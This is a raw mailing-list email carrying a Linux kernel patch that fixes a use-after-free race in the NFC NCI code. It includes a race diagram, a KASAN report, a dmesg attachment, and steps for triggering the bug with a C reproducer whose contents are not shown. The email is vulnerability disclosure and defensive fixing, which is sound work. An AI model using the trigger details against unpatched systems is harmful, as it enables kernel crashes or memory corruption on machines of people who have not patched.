Return-Path: <netdev+bounces-293015-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id GHl9AKI9GWpVtAgAu9opvQ
	(envelope-from <netdev+bounces-293015-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Fri, 29 May 2026 09:17:54 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 27EB85FE67F
	for <lists+netdev@lfdr.de>; Fri, 29 May 2026 09:17:52 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id DF1FE30277F0
	for <lists+netdev@lfdr.de>; Fri, 29 May 2026 07:13:13 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 6F9C53AE6E6;
	Fri, 29 May 2026 07:13:12 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="p3sdU6gt"
X-Original-To: netdev@vger.kernel.org
Received: from mail-wm1-f52.google.com (mail-wm1-f52.google.com [209.85.128.52])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E3EC93AEF3B
	for <netdev@vger.kernel.org>; Fri, 29 May 2026 07:13:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.128.52
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780038792; cv=pass; b=u7otw635bqKZRf8I5J5fwwMDrewUWETTr9RTZJ8ye5JUBxI7JCBevyVpAgEFDKcphfTy1Ov5KCmO5hLJXEd9Ky8vgaAvhQ6fi+m7GxBDZks9bfuYC71BV4KALCfcJJAO319jjbPBNU0pxLq9ODlJ9VNuikdfiKX5T0NZhNksrG0=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780038792; c=relaxed/simple;
	bh=JzabzHp5qO1brVVpy6xczgj1Pvw9BxqAWJPWPaBm6DY=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=d1qRXlxnYFzw28C0kpYkVsAy3iSc4niMfbNgdFvLzWbQMls6jaaW4nXAJ9d3SqcFHckRl7rx7wOpQ7YN1SGnDidJIkcOZQunMh2VudunFWdamz4ESv36nzD+eJ35Z8lt9VXcL4/0gcb1LBpubuDZTm+zbgn1qirxsiFo559srPk=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=p3sdU6gt; arc=pass smtp.client-ip=209.85.128.52
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-wm1-f52.google.com with SMTP id 5b1f17b1804b1-4893940bb5eso73105645e9.3
        for <netdev@vger.kernel.org>; Fri, 29 May 2026 00:13:08 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1780038787; cv=none;
        d=google.com; s=arc-20240605;
        b=iGuhiaxPyDU1hcs2s3UlD4BQ5+S/iTgu8qdbn1Ew/Y7exF7JXK+QGIRMWLo6PWuPwp
         +sUurwFlmufBeqDiqBchY17OsjnmbXv0t93V1BwB0foYlXTmv/pXo1cGaNBdiobDR0tx
         n6BMYINSqZcibLLClx+w2ohR7MhvNuUAYMFmhpVsTQ8WXo3ZOsEBJOfs8uYtKOV9JXDS
         gHjbyHADDkoniwPrLTEWOjcz3b6LFsFH1KmnDa8akqv+qePqX78UYlebOPPc/P+1sWSG
         k05qTK3tu16kDmSXlY6VjDV4uWdVWBhUwIoRLw6eyyvznVHDeWJ3esrTFhvkIAry3THw
         yU4Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=G3e+3CcQ+3GPeuZui9n/20c7L/1TIh2pJKC8Qa86BEM=;
        fh=3B5rifI0jmbsZCbD3bD7+dTIlPBlyEfFvJQWRk2/57Y=;
        b=k/wTt/31qKVXY93MvYuEk6UUCaFFh1As9JXGQgHYJ+Djn5d7y3cHLHFw2nImd/TKYs
         lAoW340SLPLlUcv/0CUi2a5aRPcVqhSHOCzFK8r0tr+jF1c/UsIHLX/APuLE5rBOyJlB
         Okzx9Ok4+WmneyrYL5mroQxyvAWWW1Jq4z3nW5fJNsEmkM8mj3gRTIvj0jvh3nfA5lXK
         JtUaS31Uv1lUznanqanLp+7fMraGVD1CtCEmOsDuHd6DzU52u6JMUemKY7UcvsvMODNn
         lbcxobryF4WDvL6C9i0her3kW6bCzGoqnZv8lRZVky9JgrrGblyL9yzEDgiwJLC74Hbb
         WsvA==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1780038787; x=1780643587; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=G3e+3CcQ+3GPeuZui9n/20c7L/1TIh2pJKC8Qa86BEM=;
        b=p3sdU6gtqQYK6Lu8x12xskM4tWSnR5ksC0KoyHD/7zCQPQpYQa01ocTjLuyEMw3dGS
         q6OdsHvJnwgpde1Y40iGBqCygBR/pmbWZsE9NqXtmirsfuKxsL3OYzkguHoV17Ka4DUb
         egvpwWY4gj84ZaTW04mnmLMFulFs/uvLPnqToErEeeUsx8h2nqX1mQSWsVJ4TZ4FFxl7
         8b0z/HJnA4/vjylEN5j3gj0SKNpA+SrGtk+odgGTXG91e6RrhtNoLEx79lkss9/WXxZJ
         Lkq83j0Pt9XXRiQcM3MMqyuqznCIYqGaS+hplT3fJ4/apB7XdL4uDBJli+o5farIGRsp
         Etdw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1780038787; x=1780643587;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=G3e+3CcQ+3GPeuZui9n/20c7L/1TIh2pJKC8Qa86BEM=;
        b=W0ANvCat7lz/BSgr9K4568ARE7a+JyUjZ59aTSRDB740bItZsYyRq140OC128FS6Vo
         48QvOlfaHnie3oGjXUFWjRdYfJDnx9VjrmyUe6bZPthGVWtTv1jOy3TCEjDujOXV0Pf1
         MGoPUXnW2lNuiDsqbnhOebG81+dghkac/vt7AfNXFl7PdiisbMThpAECihD8aQ6IzwTS
         hT4ywNK3k7muH5yhyZdM/rllJcIIbD+EMn0jsefMMHAYQ+ccXA+N+NKxa0idZVvkqVpx
         lGx5l7V0q0+g+JLDWarKySXyHKP/uQkEmpL1/EG909Is/48gvLmz11goFzQulc2W/s2D
         ABFg==
X-Forwarded-Encrypted: i=1; AFNElJ8EDS9hA2BPKPRogyE0boFvcJa/PB0yceR18MUCOnm9Grym08aGDobTx0WX8sCZZlhvplffPbI=@vger.kernel.org
X-Gm-Message-State: AOJu0Ywh7a4x8/HV7Dw/fuYATmoL4TO0Uqro6Z/GDPmJDq7WrFJHpbnj
	ddIqOKh7SITSOcdIdyV5XR0vgAOA5XSNp7DmLOZ7VOqJFj3H62iqiKr3pmWNlaAzFEHoh1wfL90
	YUxcaZId7J3rxH4nYtjkXmjLpQ5yhQi4=
X-Gm-Gg: Acq92OEYsa2iwnxpwQRp3PVhrRP4GMsk16EsKZspGqiwwXG9T2dW/9IYavSEi/B1JCT
	CJQEq3snY6eahoWF2BI/+ReV13ADTtoz1pEXflZoAw15F33X/F2DKgImYrKfkkQhivO0C7UyuT9
	qXeCBWrs+KdDFmpSYri4PmetY1OLjWpBmL59LU15joUNA2TS1TK65wdXDF5u57ptAbE6Irtx8rN
	Y782cLrVnseavx+hmXBlp3ZPEk/ELbXddIdQ5Q33HVRL5de7ohsHnKSZj29EqfJNEhp1f9thNDm
	j70OKk7NxL52YDFkQfkoWYlTZ3BKTtgmSFZKdTqpuWkkmhC5MQ==
X-Received: by 2002:a05:600c:1d0f:b0:490:3d2e:b67d with SMTP id
 5b1f17b1804b1-4909c0c598cmr28797535e9.30.1780038787148; Fri, 29 May 2026
 00:13:07 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Sanghyun Park <sanghyun.park.cnu@gmail.com>
Date: Fri, 29 May 2026 16:12:29 +0900
X-Gm-Features: AVHnY4LCeG5lJex0XYEbQkJ8HzfJIhyONPBCgGQ9Q1lX0XzbYIcHbElRwC2CZ04
Message-ID: <CAOrxSK5UmFFfzdRG+P89+E+Rvg_1DmOvTs+M7353Q8=hkPXmSg@mail.gmail.com>
Subject: [PATCH] nfc: nci: Fix use-after-free on conn_info in nci_tx_work()
To: krzk@kernel.org
Cc: davem@davemloft.net, edumazet@google.com, kuba@kernel.org, 
	pabeni@redhat.com, netdev@vger.kernel.org, linux-kernel@vger.kernel.org
Content-Type: multipart/mixed; boundary="00000000000098464e0652ef9340"
X-Spamd-Result: default: False [-1.06 / 15.00];
	MIME_BASE64_TEXT_BOGUS(1.00)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
	MAILLIST(-0.15)[generic];
	MIME_BASE64_TEXT(0.10)[];
	MIME_GOOD(-0.10)[multipart/mixed,multipart/alternative,text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	TAGGED_FROM(0.00)[bounces-293015-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	DKIM_TRACE(0.00)[gmail.com:+];
	RCVD_TLS_LAST(0.00)[];
	MIME_TRACE(0.00)[0:+,1:+,2:+,3:~,4:+,5:~];
	FORGED_SENDER_MAILLIST(0.00)[];
	HAS_ATTACHMENT(0.00)[];
	MISSING_XM_UA(0.00)[];
	FREEMAIL_FROM(0.00)[gmail.com];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[sanghyunparkcnu@gmail.com,netdev@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	NEURAL_HAM(-0.00)[-0.972];
	RCPT_COUNT_SEVEN(0.00)[7];
	MID_RHS_MATCH_FROMTLD(0.00)[];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[mail.gmail.com:mid,sea.lore.kernel.org:rdns,sea.lore.kernel.org:helo]
X-Rspamd-Queue-Id: 27EB85FE67F
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

--00000000000098464e0652ef9340
Content-Type: multipart/alternative; boundary="00000000000098464d0652ef933e"

--00000000000098464d0652ef933e
Content-Type: text/plain; charset="UTF-8"

nci_tx_work() calls nci_get_conn_info_by_conn_id() to look up a
conn_info and then dereferences it extensively (reading credits_cnt,
calling nci_send_frame, etc). The lookup and subsequent use are done
without any locking.

A concurrent nci_core_conn_close_rsp_packet(), processed on the
separate rx_wq workqueue, can call list_del() + devm_kfree() on the
same conn_info while nci_tx_work() is still using it, resulting in a
use-after-free.

Fix by flushing the tx workqueue before removing and freeing a
conn_info in nci_core_conn_close_rsp_packet(). This ensures any
in-progress nci_tx_work() has completed before the conn_info is freed.
The two workqueues (rx_wq, tx_wq) are independent, so this cannot
deadlock.

Race:

  CPU0 (nfc0_nci_tx_wq)              CPU1 (nfc0_nci_rx_wq)
  ============================       ==========================
  nci_tx_work():
    conn_info = nci_get_conn_info_by_conn_id()
    // no lock held, raw pointer
                                     nci_core_conn_close_rsp_packet():
                                       list_del(&conn_info->list)
                                       devm_kfree(conn_info)
    atomic_read(&conn_info->credits_cnt)
    // UAF: conn_info is freed

Reproduction:

  1. Build kernel >= 3.4 with CONFIG_KASAN=y, CONFIG_NFC=y,
     CONFIG_NFC_NCI=y, CONFIG_NFC_VIRTUAL_NCI=m
  2. Boot in a VM, load virtual_nci module
  3. Compile: gcc -O2 -o repro -static -pthread repro.c
  4. Run as root: ./repro
  5. Check dmesg for: BUG: KASAN: slab-use-after-free in nci_tx_work
     or: BUG: KASAN: invalid-free in nci_rsp_packet

  The reproducer opens /dev/virtual_nci, brings up an NFC device via
  generic netlink, activates an RF interface, then races raw NFC data
  sends against injected NCI CONN_CLOSE response packets. The tx_wq
  and rx_wq are separate singlethread workqueues, allowing the race.

KASAN report (reproduced on 6.12.91 via /dev/virtual_nci):

  BUG: KASAN: invalid-free in nci_rsp_packet+0x1424/0x21f0
  Free of addr ffff88810da31028 by task kworker/u8:0/12

  Workqueue: nfc0_nci_rx_wq nci_rx_work
  Call Trace:
   kfree+0x126/0x4d0
   nci_rsp_packet+0x1424/0x21f0
   nci_rx_work+0x2a1/0x440
   process_one_work+0x953/0x1820

  Allocated by task 37:
   devm_kmalloc+0xa8/0x230
   nci_rsp_packet+0x1a46/0x21f0
   nci_rx_work+0x2a1/0x440

Fixes: 6a2968aaf50c ("NFC: basic NCI protocol implementation")
Signed-off-by: Sanghyun Park <sanghyun.park.cnu@gmail.com>
---

Hi,

I'm Sanghyun Park, a security researcher. I found this while auditing
the NFC NCI core code. The bug has existed since NCI was introduced in
3.4 and affects all kernels since then (Ubuntu 14.04+, Fedora 17+,
Debian 8+, etc.) on systems with NFC hardware or the virtual_nci module.

The C reproducer is attached separately (repro.c).

 net/nfc/nci/rsp.c | 8 ++++++++
 1 file changed, 8 insertions(+)

diff --git a/net/nfc/nci/rsp.c b/net/nfc/nci/rsp.c
index 839a5c80de..c4d8e9f1a2 100644
--- a/net/nfc/nci/rsp.c
+++ b/net/nfc/nci/rsp.c
@@ -333,6 +333,14 @@ static void nci_core_conn_close_rsp_packet(struct
nci_dev *ndev,
  conn_info = nci_get_conn_info_by_conn_id(ndev,
  ndev->cur_conn_id);
  if (conn_info) {
+ /*
+ * Flush any pending nci_tx_work before removing the
+ * conn_info.  nci_tx_work looks up conn_info without
+ * locking, so it must not be running while we free
+ * the entry.  The two workqueues (rx_wq, tx_wq) are
+ * independent, so this cannot deadlock.
+ */
+ flush_workqueue(ndev->tx_wq);
  list_del(&conn_info->list);
  if (conn_info == ndev->rf_conn_info)
  ndev->rf_conn_info = NULL;

--00000000000098464d0652ef933e
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">nci_tx_work() calls nci_get_conn_info_by_conn_id() to look=
 up a<br>conn_info and then dereferences it extensively (reading credits_cn=
t,<br>calling nci_send_frame, etc). The lookup and subsequent use are done<=
br>without any locking.<br><br>A concurrent nci_core_conn_close_rsp_packet(=
), processed on the<br>separate rx_wq workqueue, can call list_del() + devm=
_kfree() on the<br>same conn_info while nci_tx_work() is still using it, re=
sulting in a<br>use-after-free.<br><br>Fix by flushing the tx workqueue bef=
ore removing and freeing a<br>conn_info in nci_core_conn_close_rsp_packet()=
. This ensures any<br>in-progress nci_tx_work() has completed before the co=
nn_info is freed.<br>The two workqueues (rx_wq, tx_wq) are independent, so =
this cannot<br>deadlock.<br><br>Race:<br><br>=C2=A0 CPU0 (nfc0_nci_tx_wq) =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0CPU1 (nfc0_nci_rx_wq)<br>=
=C2=A0 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D =C2=A0 =C2=A0 =C2=A0 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D<br>=C2=A0 nci_tx_work():<br>=
=C2=A0 =C2=A0 conn_info =3D nci_get_conn_info_by_conn_id()<br>=C2=A0 =C2=A0=
 // no lock held, raw pointer<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0nci_core_conn_close_rsp_packet():<br>=C2=A0 =C2=A0 =C2=A0 =
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0list_del(&amp;conn_info-&gt;li=
st)<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0de=
vm_kfree(conn_info)<br>=C2=A0 =C2=A0 atomic_read(&amp;conn_info-&gt;credits=
_cnt)<br>=C2=A0 =C2=A0 // UAF: conn_info is freed<br><br>Reproduction:<br><=
br>=C2=A0 1. Build kernel &gt;=3D 3.4 with CONFIG_KASAN=3Dy, CONFIG_NFC=3Dy=
,<br>=C2=A0 =C2=A0 =C2=A0CONFIG_NFC_NCI=3Dy, CONFIG_NFC_VIRTUAL_NCI=3Dm<br>=
=C2=A0 2. Boot in a VM, load virtual_nci module<br>=C2=A0 3. Compile: gcc -=
O2 -o repro -static -pthread repro.c<br>=C2=A0 4. Run as root: ./repro<br>=
=C2=A0 5. Check dmesg for: BUG: KASAN: slab-use-after-free in nci_tx_work<b=
r>=C2=A0 =C2=A0 =C2=A0or: BUG: KASAN: invalid-free in nci_rsp_packet<br><br=
>=C2=A0 The reproducer opens /dev/virtual_nci, brings up an NFC device via<=
br>=C2=A0 generic netlink, activates an RF interface, then races raw NFC da=
ta<br>=C2=A0 sends against injected NCI CONN_CLOSE response packets. The tx=
_wq<br>=C2=A0 and rx_wq are separate singlethread workqueues, allowing the =
race.<br><br>KASAN report (reproduced on 6.12.91 via /dev/virtual_nci):<br>=
<br>=C2=A0 BUG: KASAN: invalid-free in nci_rsp_packet+0x1424/0x21f0<br>=C2=
=A0 Free of addr ffff88810da31028 by task kworker/u8:0/12<br><br>=C2=A0 Wor=
kqueue: nfc0_nci_rx_wq nci_rx_work<br>=C2=A0 Call Trace:<br>=C2=A0 =C2=A0kf=
ree+0x126/0x4d0<br>=C2=A0 =C2=A0nci_rsp_packet+0x1424/0x21f0<br>=C2=A0 =C2=
=A0nci_rx_work+0x2a1/0x440<br>=C2=A0 =C2=A0process_one_work+0x953/0x1820<br=
><br>=C2=A0 Allocated by task 37:<br>=C2=A0 =C2=A0devm_kmalloc+0xa8/0x230<b=
r>=C2=A0 =C2=A0nci_rsp_packet+0x1a46/0x21f0<br>=C2=A0 =C2=A0nci_rx_work+0x2=
a1/0x440<br><br>Fixes: 6a2968aaf50c (&quot;NFC: basic NCI protocol implemen=
tation&quot;)<br>Signed-off-by: Sanghyun Park &lt;<a href=3D"mailto:sanghyu=
n.park.cnu@gmail.com">sanghyun.park.cnu@gmail.com</a>&gt;<br>---<br><br>Hi,=
<br><br>I&#39;m Sanghyun Park, a security researcher. I found this while au=
diting<br>the NFC NCI core code. The bug has existed since NCI was introduc=
ed in<br>3.4 and affects all kernels since then (Ubuntu 14.04+, Fedora 17+,=
<br>Debian 8+, etc.) on systems with NFC hardware or the virtual_nci module=
.<br><br>The C reproducer is attached separately (repro.c).<br><br>=C2=A0ne=
t/nfc/nci/rsp.c | 8 ++++++++<br>=C2=A01 file changed, 8 insertions(+)<br><b=
r>diff --git a/net/nfc/nci/rsp.c b/net/nfc/nci/rsp.c<br>index 839a5c80de..c=
4d8e9f1a2 100644<br>--- a/net/nfc/nci/rsp.c<br>+++ b/net/nfc/nci/rsp.c<br>@=
@ -333,6 +333,14 @@ static void nci_core_conn_close_rsp_packet(struct nci_d=
ev *ndev,<br>=C2=A0		conn_info =3D nci_get_conn_info_by_conn_id(ndev,<br>=
=C2=A0							 ndev-&gt;cur_conn_id);<br>=C2=A0		if (conn_info) {<br>+			/*<=
br>+			 * Flush any pending nci_tx_work before removing the<br>+			 * conn_=
info. =C2=A0nci_tx_work looks up conn_info without<br>+			 * locking, so it=
 must not be running while we free<br>+			 * the entry.=C2=A0 The two workq=
ueues (rx_wq, tx_wq) are<br>+			 * independent, so this cannot deadlock.<br=
>+			 */<br>+			flush_workqueue(ndev-&gt;tx_wq);<br>=C2=A0			list_del(&amp;=
conn_info-&gt;list);<br>=C2=A0			if (conn_info =3D=3D ndev-&gt;rf_conn_info=
)<br>=C2=A0				ndev-&gt;rf_conn_info =3D NULL;<div><br></div></div>

--00000000000098464d0652ef933e--
--00000000000098464e0652ef9340
Content-Type: text/plain; charset="US-ASCII"; name="kasan_dmesg.txt"
Content-Disposition: attachment; filename="kasan_dmesg.txt"
Content-Transfer-Encoding: base64
Content-ID: <f_mpql3p091>
X-Attachment-Id: f_mpql3p091

WyAgIDQzLjQxNzYxOV0gQlVHOiBLQVNBTjogaW52YWxpZC1mcmVlIGluIG5jaV9yc3BfcGFja2V0
KzB4MTQyNC8weDIxZjAKWyAgIDQzLjQxODM1M10gRnJlZSBvZiBhZGRyIGZmZmY4ODgxMGRhMzEw
MjggYnkgdGFzayBrd29ya2VyL3U4OjAvMTIKClsgICA0My40MTkyNDVdIENQVTogMSBVSUQ6IDAg
UElEOiAxMiBDb21tOiBrd29ya2VyL3U4OjAgTm90IHRhaW50ZWQgNi4xMi45MS1kaXJ0eSAjMjQK
WyAgIDQzLjQxOTI2MF0gSGFyZHdhcmUgbmFtZTogUUVNVSBVYnVudHUgMjUuMDQgUEMgKGk0NDBG
WCArIFBJSVgsIDE5OTYpLCBCSU9TIDEuMTYuMy1kZWJpYW4tMS4xNi4zLTIgMDQvMDEvMjAxNApb
ICAgNDMuNDE5MjY0XSBXb3JrcXVldWU6IG5mYzBfbmNpX3J4X3dxIG5jaV9yeF93b3JrClsgICA0
My40MTkyNzRdIENhbGwgVHJhY2U6ClsgICA0My40MTkyNzZdICA8VEFTSz4KWyAgIDQzLjQxOTI3
OV0gIGR1bXBfc3RhY2tfbHZsKzB4YmEvMHgxMTAKWyAgIDQzLjQxOTI4N10gIHByaW50X3JlcG9y
dCsweDE3NC8weDRmNgpbICAgNDMuNDE5MzI4XSAgPyBfX3ZpcnRfYWRkcl92YWxpZCsweDg2LzB4
NjcwClsgICA0My40MTkzNTVdICA/IG5jaV9yc3BfcGFja2V0KzB4MTQyNC8weDIxZjAKWyAgIDQz
LjQxOTM2MV0gID8gbmNpX3JzcF9wYWNrZXQrMHgxNDI0LzB4MjFmMApbICAgNDMuNDE5MzY2XSAg
a2FzYW5fcmVwb3J0X2ludmFsaWRfZnJlZSsweGFhLzB4ZDAKWyAgIDQzLjQxOTM4NF0gID8gbmNp
X3JzcF9wYWNrZXQrMHgxNDI0LzB4MjFmMApbICAgNDMuNDE5MzkwXSAgPyBuY2lfcnNwX3BhY2tl
dCsweDE0MjQvMHgyMWYwClsgICA0My40MTkzOTVdICBjaGVja19zbGFiX2FsbG9jYXRpb24rMHgx
MTYvMHgxMjAKWyAgIDQzLjQxOTQwMF0gIGtmcmVlKzB4MTI2LzB4NGQwClsgICA0My40MTk0MDdd
ICA/IG5mY19zZW5kX3RvX3Jhd19zb2NrKzB4M2EvMHgyMzAKWyAgIDQzLjQxOTQxMl0gID8gbmNp
X3JzcF9wYWNrZXQrMHgxNDI0LzB4MjFmMApbICAgNDMuNDE5NDE4XSAgbmNpX3JzcF9wYWNrZXQr
MHgxNDI0LzB4MjFmMApbICAgNDMuNDE5NDMwXSAgPyBuZmNfc2VuZF90b19yYXdfc29jaysweDEw
MS8weDIzMApbICAgNDMuNDE5NDM5XSAgbmNpX3J4X3dvcmsrMHgyYTEvMHg0NDAKWyAgIDQzLjQx
OTQ0N10gIHByb2Nlc3Nfb25lX3dvcmsrMHg5NTMvMHgxODIwClsgICA0My40MTk0NTRdICA/IF9f
cGZ4X3Byb2Nlc3Nfb25lX3dvcmsrMHgxMC8weDEwClsgICA0My40MTk0NjJdICA/IF9fcGZ4X25j
aV9yeF93b3JrKzB4MTAvMHgxMApbICAgNDMuNDE5NDY5XSAgd29ya2VyX3RocmVhZCsweDVjZC8w
eGUyMApbICAgNDMuNDE5NDc2XSAgPyBfX3BmeF93b3JrZXJfdGhyZWFkKzB4MTAvMHgxMApbICAg
NDMuNDE5NDgxXSAga3RocmVhZCsweDJiMi8weDM2MApbICAgNDMuNDE5NDg1XSAgPyBfX3BmeF9r
dGhyZWFkKzB4MTAvMHgxMApbICAgNDMuNDE5NDkwXSAgcmV0X2Zyb21fZm9yaysweDRkLzB4ODAK
WyAgIDQzLjQxOTQ5Nl0gID8gX19wZnhfa3RocmVhZCsweDEwLzB4MTAKWyAgIDQzLjQxOTUwMF0g
IHJldF9mcm9tX2ZvcmtfYXNtKzB4MWEvMHgzMApbICAgNDMuNDE5NTA3XSAgPC9UQVNLPgoKWyAg
IDQzLjQzNTE2MV0gQWxsb2NhdGVkIGJ5IHRhc2sgMzc6ClsgICA0My40MzU1NjZdICBrYXNhbl9z
YXZlX3N0YWNrKzB4MzAvMHg1MApbICAgNDMuNDM2MDQ3XSAga2FzYW5fc2F2ZV90cmFjaysweDE0
LzB4MzAKWyAgIDQzLjQzNjQ5OF0gIF9fa2FzYW5fa21hbGxvYysweGFhLzB4YjAKWyAgIDQzLjQz
Njk2MF0gIF9fa21hbGxvY19ub2RlX3RyYWNrX2NhbGxlcl9ub3Byb2YrMHgyMTYvMHg0OTAKWyAg
IDQzLjQzNzU5NF0gIGRldm1fa21hbGxvYysweGE4LzB4MjMwClsgICA0My40MzgwMzRdICBuY2lf
cnNwX3BhY2tldCsweDFhNDYvMHgyMWYwClsgICA0My40Mzg1MDhdICBuY2lfcnhfd29yaysweDJh
MS8weDQ0MApbICAgNDMuNDM4OTY4XSAgcHJvY2Vzc19vbmVfd29yaysweDk1My8weDE4MjAKWyAg
IDQzLjQzOTQ0Nl0gIHdvcmtlcl90aHJlYWQrMHg1Y2QvMHhlMjAKWyAgIDQzLjQzOTg5Ml0gIGt0
aHJlYWQrMHgyYjIvMHgzNjAKWyAgIDQzLjQ0MDI3OF0gIHJldF9mcm9tX2ZvcmsrMHg0ZC8weDgw
ClsgICA0My40NDA3MDFdICByZXRfZnJvbV9mb3JrX2FzbSsweDFhLzB4MzAKClsgICA0My40NDEz
NjhdIFRoZSBidWdneSBhZGRyZXNzIGJlbG9uZ3MgdG8gdGhlIG9iamVjdCBhdCBmZmZmODg4MTBk
YTMxMDAwCiAgICAgICAgICAgICAgICB3aGljaCBiZWxvbmdzIHRvIHRoZSBjYWNoZSBrbWFsbG9j
LTEyOCBvZiBzaXplIDEyOApbICAgNDMuNDQyNzUxXSBUaGUgYnVnZ3kgYWRkcmVzcyBpcyBsb2Nh
dGVkIDQwIGJ5dGVzIGluc2lkZSBvZgogICAgICAgICAgICAgICAgMTI4LWJ5dGUgcmVnaW9uIFtm
ZmZmODg4MTBkYTMxMDAwLCBmZmZmODg4MTBkYTMxMDgwKQoKWyAgIDQzLjQ0NDI3MV0gVGhlIGJ1
Z2d5IGFkZHJlc3MgYmVsb25ncyB0byB0aGUgcGh5c2ljYWwgcGFnZToKWyAgIDQzLjQ0NDkyMF0g
cGFnZTogcmVmY291bnQ6MSBtYXBjb3VudDowIG1hcHBpbmc6MDAwMDAwMDAwMDAwMDAwMCBpbmRl
eDoweDAgcGZuOjB4MTBkYTMxClsgICA0My40NDU4MjZdIGZsYWdzOiAweDIwMDAwMDAwMDAwMDAw
MChub2RlPTB8em9uZT0yKQpbICAgNDMuNDQ2NDA3XSBwYWdlX3R5cGU6IGY1KHNsYWIpClsgICA0
My40NDY3ODVdIHJhdzogMDIwMDAwMDAwMDAwMDAwMCBmZmZmODg4MTAwMDQxYTAwIGZmZmZlYTAw
MDQ0MGQxODAgZGVhZDAwMDAwMDAwMDAwNApbICAgNDMuNDQ3NjY4XSByYXc6IDAwMDAwMDAwMDAw
MDAwMDAgMDAwMDAwMDAwMDEwMDAxMCAwMDAwMDAwMWY1MDAwMDAwIDAwMDAwMDAwMDAwMDAwMDAK
WyAgIDQzLjQ0ODU0NF0gcGFnZSBkdW1wZWQgYmVjYXVzZToga2FzYW46IGJhZCBhY2Nlc3MgZGV0
ZWN0ZWQK
--00000000000098464e0652ef9340
Content-Type: application/octet-stream; name="repro.c"
Content-Disposition: attachment; filename="repro.c"
Content-Transfer-Encoding: base64
Content-ID: <f_mpql3mqz0>
X-Attachment-Id: f_mpql3mqz0

